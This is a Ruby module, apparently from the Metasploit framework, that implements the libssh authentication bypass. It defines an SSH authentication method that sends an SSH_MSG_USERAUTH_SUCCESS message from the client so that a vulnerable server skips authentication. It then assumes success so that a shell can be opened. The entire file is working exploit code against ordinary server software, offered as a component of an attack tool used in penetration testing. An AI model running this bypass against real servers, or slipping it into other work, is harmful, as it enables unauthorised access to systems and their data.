# -*- coding: binary -*-

module Msf::Exploit::Remote::SSH
module AuthMethods
module LibsshAuthBypass

  #
  # https://tools.ietf.org/rfc/rfc4252.txt
  #
  class Net::SSH::Authentication::Methods::LibsshAuthBypass < Net::SSH::Authentication::Methods::Abstract
    def authenticate(service_name, username, password = nil)
      debug { 'Sending SSH_MSG_USERAUTH_SUCCESS' }

      # USERAUTH_SUCCESS is OOB and elicits no reply
      send_message(Net::SSH::Buffer.from(
=begin
        byte      SSH_MSG_USERAUTH_SUCCESS
=end
        :byte, USERAUTH_SUCCESS
      ))

      # We can't fingerprint or otherwise reduce false positives using a session
      # channel open, since most implementations I've seen support only one
      # session channel and don't support channel closing, so this would block
      # us from getting a shell
      #
      # Secondly, libssh doesn't send a CHANNEL_OPEN_FAILURE when we're not
      # authed, so we have to wait for a timeout on CHANNEL_OPEN to return false

      # So assume we succeeded until we can verify
      true
    end
  end

end
end
end
